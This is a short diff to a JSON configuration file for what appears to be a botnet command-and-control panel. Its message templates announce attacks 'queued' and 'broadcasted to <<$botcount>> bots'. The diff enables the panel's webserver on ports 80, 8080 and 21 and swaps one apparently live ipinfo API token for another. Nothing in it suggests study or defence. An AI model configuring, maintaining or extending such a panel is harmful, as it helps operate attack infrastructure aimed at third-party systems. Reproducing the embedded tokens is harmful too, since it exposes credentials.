@@ -9,7 +9,7 @@
     "port": 30120
   },
   "webserver": {
-    "enabled": false,
+    "enabled": true,
     "http": 80,
     "http2": 8080,
     "ftp": 21,
@@ -19,5 +19,5 @@
     "queuedMessage": "Attack has been queued in spot <<$pos>>. It will be launched in <<$waittime>> seconds.",
     "broadcastMessage": "Queued attack has been broadcasted to <<$botcount>> bots"
   },
-  "ipInfoToken": "ac19a7da47f380"
+  "ipInfoToken": "96c2f066646363"
 }
